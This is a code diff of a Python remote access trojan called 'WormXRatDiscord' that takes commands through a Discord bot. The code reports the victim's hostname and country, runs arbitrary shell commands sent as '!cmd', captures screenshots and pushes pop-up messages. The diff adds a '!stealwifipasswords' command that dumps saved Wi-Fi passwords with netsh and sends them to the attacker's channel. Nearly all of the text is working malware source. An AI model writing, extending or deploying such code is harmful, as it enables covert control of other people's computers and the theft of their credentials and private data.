@@ -13,12 +13,11 @@ import threading
 from tkinter import messagebox
 
 session = uuid.uuid4()
-TOKEN = "" # <---- Bot token discord
+TOKEN = "" # <------ Token discord
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
 intents.message_content = True
-
 
 try:
     response = requests.get('https://ipinfo.io/json')
@@ -33,14 +32,12 @@ channel_ref = None
 def get_hostname():
     return socket.gethostname().lower().replace(" ", "-")
 
-
 async def send_msg(channel, text):
     if len(text) > 1900:
         with io.BytesIO(text.encode('utf-8')) as out_file:
             await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
     else:
         await channel.send(f"```\n{text}\n```")
-
 
 def show_popup(msg):
     messagebox.showinfo("WormXRatDiscord", msg)
@@ -59,7 +56,7 @@ async def on_ready():
             f"📍 Country: `{country}`\n"
             f"Session: `{session}`\n"
             "--- Commands ---\n"
-            "`!cmd <command>` | `!screen` | `!chatsendmsg <text>`"
+            "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`"
         )
         await channel_ref.send(header)
     except Exception as e:
@@ -72,8 +69,27 @@ async def on_message(message):
     if message.author == client.user: return
     if channel_ref is None or message.channel.id != channel_ref.id: return
 
-    
-    if message.content == "!screen":
+    if message.content == "!stealwifipasswords":
+        try:
+            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
+            profiles = [i.split(":")[1][1:-1] for i in meta_data.split('\n') if "All User Profile" in i]
+            
+            wifi_list = []
+            for name in profiles:
+                try:
+                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
+                    password_line = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
+                    password = password_line[0] if password_line else "None"
+                    wifi_list.append(f"SSID: {name} Password: {password}")
+                except:
+                    wifi_list.append(f"SSID: {name} Password: ERROR")
+            
+            final_output = "\n".join(wifi_list) if wifi_list else "No Wi-Fi profiles found."
+            await send_msg(message.channel, final_output)
+        except Exception as e:
+            await message.channel.send(f"❌ WiFi Error: {e}")
+
+    elif message.content == "!screen":
         path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
         try:
             pyautogui.screenshot(path)
@@ -82,20 +98,14 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"Screenshot Error: {e}")
 
-    
     elif message.content.startswith("!chatsendmsg "):
         announcemsg = message.content[len("!chatsendmsg "):].strip()
         userip = socket.gethostbyname(socket.gethostname())
-        
-        
         threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
-        
         await message.channel.send(f"✅ Pop-up sent to `{userip}`. Bot is still responsive.")
 
-    
     elif message.content.startswith("!cmd "):
         cmd = message.content[5:].strip()
-        
         if cmd.startswith("cd "):
             new_path = cmd[3:].strip()
             try:
@@ -108,17 +118,13 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(f"❌ Error: {e}")
             return
-
         try:
             result = subprocess.run(
                 cmd, shell=True, capture_output=True, text=True, 
                 encoding="cp852", errors="replace", cwd=current_dir
             )
             output = (result.stdout or result.stderr or "Executed (no output).").strip()
-            
-            
             await send_msg(message.channel, output)
-            
         except Exception as e:
             await message.channel.send(f"Error executing command: {e}")
 
